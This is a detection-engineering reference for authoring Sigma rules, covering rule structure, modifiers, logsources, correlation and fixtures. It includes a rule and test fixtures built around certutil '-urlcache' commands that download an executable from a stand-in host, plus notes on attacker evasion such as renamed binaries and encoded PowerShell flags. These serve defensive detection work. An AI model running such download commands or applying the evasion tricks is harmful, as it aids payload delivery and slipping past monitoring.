# Sigma authoring reference (pySigma 1.5 / Sigma spec 2.x)

Sigma is the source of truth in this repo. Everything else is compiled from it, or hand-written
only when Sigma cannot express the logic.

## Rule skeleton (team policy, enforced by `dettools.validate`)

```yaml
title: Short Behaviour Description            # <= 110 chars, unique
id: <uuid4 from dettools.scaffold>
status: experimental                          # experimental -> test -> stable
description: What it detects and why it matters.
references: [https://attack.mitre.org/techniques/T1105/]
author: Detection Engineering Team
date: 2026-10-09                              # modified: on later edits
tags: [attack.command-and-control, attack.t1105]   # >= 1 tactic + >= 1 technique
logsource: {category: process_creation, product: windows}
detection:
  selection_img:
    - Image|endswith: '\certutil.exe'
    - OriginalFileName: 'CertUtil.exe'
  selection_cli:
    CommandLine|contains|windash: '-urlcache '
  filter_main_known_admin:
    ParentImage|endswith: '\ccmexec.exe'
  condition: all of selection_* and not 1 of filter_main_*
falsepositives: [Administrators retrieving CRLs]
level: high
```

## Matching semantics

- Values are **case-insensitive** by default. Use `|cased` to force case-sensitive matching.
- A list under one field is an **OR**. Keys in one map are **AND**. A list of maps is an OR of ANDs.
- Plain values match exactly, after wildcards: `*` is any sequence and `?` is one character.
  Escape a literal with `\*`. A single backslash before an ordinary character stays literal, so
  `'\certutil.exe'` needs no doubling.
- `null` means the field is absent or empty. `''` means an empty string.
- `condition`: `and`, `or`, `not`, parentheses, `1 of selection_*`, `all of selection_*`,
  `1 of them`. Sigma precedence is NOT > AND > OR.

## Modifiers

| Modifier | Meaning | Notes |
|---|---|---|
| `contains` / `startswith` / `endswith` | substring/prefix/suffix | |
| `all` | every list value must match (AND) | `CommandLine|contains|all: [a, b]` |
| `windash` | expands `-x` to `/x`, `–x`, `—x`, `―x` | Use on every Windows flag |
| `re` | regex (PCRE subset) | Add `|i` / `|m` / `|s` sub-modifiers. Avoid when contains works: it's slow in most SIEMs |
| `cidr` | IP in network | `DestinationIp|cidr: 10.0.0.0/8` |
| `base64` / `base64offset` | match a base64-encoded value | Pair `base64offset` with `contains` |
| `wide` / `utf16le` | UTF-16 before base64 | PowerShell `-enc` payloads: `|wide|base64offset|contains` |
| `gt` `gte` `lt` `lte` | numeric compare | |
| `exists` | field present (`true`/`false`) | |
| `fieldref` | compare to another field | Poor support outside Splunk/Elastic |
| `expand` | placeholder (`%admins%`) | Needs a pipeline that defines it. The offline evaluator rejects it |
| `cased` | case-sensitive | |

## Logsource taxonomy (what pipelines key on)

Windows categories: `process_creation`, `network_connection`, `file_event`, `file_delete`,
`registry_set` / `registry_add` / `registry_delete` / `registry_event`, `image_load`,
`dns_query`, `pipe_created`, `process_access`, `create_remote_thread`, `driver_load`,
`ps_script` (4104), `ps_module`. Services: `security`, `system`, `sysmon`, `powershell`,
`taskscheduler`, `wmi`. Other products: `linux` (`process_creation`, `auditd`), `macos`, `aws`
(`cloudtrail`), `azure` (`signinlogs`, `activitylogs`, `auditlogs`), `gcp` (`gcp.audit`),
`okta`, `m365`, `github`. Check `docs/siem/field-mappings.md` before choosing one: an unmapped
logsource is a coverage gap.

## Correlation rules (Sigma 2.x)

Use these for thresholds, temporal ordering and distinct-value counts. Write them as a
multi-document YAML file. The base rules need a `name:`.

```yaml
title: Many Failed Logons From One Source
name: failed_logon
logsource: {product: windows, service: security}
detection: {selection: {EventID: 4625}, condition: selection}
---
title: Brute Force From Single Source
id: <uuid>
correlation:
  type: event_count          # event_count | value_count | temporal | temporal_ordered
  rules: [failed_logon]
  group-by: [IpAddress]
  timespan: 5m
  condition: {gte: 20}
level: medium
```

Backend support differs by target. Splunk, Elastic ES|QL/EQL and Kusto have correlation
support in recent versions. Check with `dettools.translate`. The offline evaluator raises
`UnsupportedSigmaFeature` for correlations, so there is no fixture-based test. Say so, and
hand-verify the compiled query against each language reference.

## Anti-evasion habits

- Pair `Image|endswith` with `OriginalFileName` so renamed binaries still match.
- Use `windash` on every flag, and `contains` rather than exact match on command lines (quotes,
  extra spaces and argument order vary).
- Don't anchor on a full path the attacker controls. Do anchor on a path they can't write to when
  you are filtering benign activity.
- For PowerShell: `-e`, `-en`, `-enc`, `-EncodedCommand` are all valid prefixes of
  `-EncodedCommand`.
- Filters must use fields the attacker cannot set cheaply: parent image in a protected path,
  signed status, user SID. Never a substring of the attacker's own command line.

## Fixtures (`tests/events/<rule>.yml`)

```yaml
rule_id: <same uuid>
true_positives:
  - name: canonical
    event: {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -urlcache -f http://x/a.exe a.exe'}
  - name: renamed binary + slash flags
    event: {Image: 'C:\Users\Public\c.exe', OriginalFileName: 'CertUtil.exe', CommandLine: 'c /urlcache /f http://x/a a'}
true_negatives:
  - name: benign closest look-alike
    event: {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -store My'}
```

Every filter needs a true negative that it removes. Every evasion you claim to handle needs a
true positive.
